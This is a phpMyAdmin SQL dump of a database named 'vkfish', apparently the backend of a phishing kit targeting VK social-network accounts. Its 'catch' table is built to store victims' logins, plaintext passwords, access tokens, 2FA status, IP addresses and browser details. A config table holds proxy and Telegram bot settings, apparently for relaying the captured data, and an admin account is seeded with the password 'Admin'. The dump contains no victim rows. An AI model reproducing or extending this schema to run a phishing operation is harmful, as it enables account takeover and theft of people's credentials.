-- phpMyAdmin SQL Dump
-- version 4.6.5.2
-- https://www.phpmyadmin.net/
--
-- Хост: 127.0.0.1:3306
-- Время создания: Сен 01 2019 г., 17:49
-- Версия сервера: 5.7.16
-- Версия PHP: 5.6.29

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `vkfish`
--

-- --------------------------------------------------------

--
-- Структура таблицы `catch`
--

CREATE TABLE `catch` (
  `id` int(11) NOT NULL,
  `uid` int(16) NOT NULL,
  `firstname` varchar(32) NOT NULL,
  `lastname` varchar(32) NOT NULL,
  `access_token` varchar(255) NOT NULL,
  `country` varchar(2) NOT NULL,
  `login` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `2fa` int(1) NOT NULL,
  `avatar` varchar(255) NOT NULL,
  `friends` int(4) NOT NULL,
  `followers` int(7) NOT NULL,
  `votes` int(5) NOT NULL,
  `referal` varchar(6) NOT NULL,
  `invite` varchar(6) NOT NULL,
  `mailing` int(1) NOT NULL DEFAULT '0',
  `hide` varchar(1) NOT NULL DEFAULT '0',
  `ip` varchar(32) NOT NULL,
  `browser` varchar(32) NOT NULL,
  `os` varchar(32) NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `config`
--

CREATE TABLE `config` (
  `id` int(11) NOT NULL,
  `status` int(1) NOT NULL,
  `https` int(1) NOT NULL,
  `proxy` varchar(24) NOT NULL,
  `dark_theme` int(1) NOT NULL DEFAULT '0',
  `preloader` int(1) NOT NULL DEFAULT '0',
  `access_token` varchar(255) NOT NULL,
  `vkapiVersion` varchar(8) NOT NULL,
  `group_id` varchar(10) NOT NULL,
  `mailing` int(1) NOT NULL DEFAULT '0',
  `tg_bot` int(1) NOT NULL DEFAULT '0',
  `tg_chat_id` varchar(16) NOT NULL,
  `tg_token` varchar(255) NOT NULL,
  `display_errors` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `config`
--

INSERT INTO `config` (`id`, `status`, `https`, `proxy`, `dark_theme`, `preloader`, `access_token`, `vkapiVersion`, `group_id`, `mailing`, `tg_bot`, `tg_chat_id`, `tg_token`, `display_errors`) VALUES
(1, 1, 0, '127.0.0.1:8080', 1, 1, 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', '5.101', '123456', 0, 0, '', '', 0);

-- --------------------------------------------------------

--
-- Структура таблицы `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `login` varchar(16) NOT NULL,
  `password` varchar(32) NOT NULL,
  `code` varchar(32) NOT NULL,
  `dark_theme` int(1) NOT NULL DEFAULT '0',
  `preloader` int(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `users`
--

INSERT INTO `users` (`id`, `login`, `password`, `code`, `dark_theme`, `preloader`) VALUES
(1, 'Admin', 'Admin', '7ae2fb3d110c807c3f3e67001e5ddfb2', 0, 0);

-- --------------------------------------------------------

--
-- Структура таблицы `visitors`
--

CREATE TABLE `visitors` (
  `id` int(11) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `os` varchar(32) NOT NULL,
  `browser` varchar(32) NOT NULL,
  `url` varchar(256) NOT NULL DEFAULT 'Unknown',
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `catch`
--
ALTER TABLE `catch`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `config`
--
ALTER TABLE `config`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `visitors`
--
ALTER TABLE `visitors`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `catch`
--
ALTER TABLE `catch`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT для таблицы `config`
--
ALTER TABLE `config`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `visitors`
--
ALTER TABLE `visitors`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=60;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
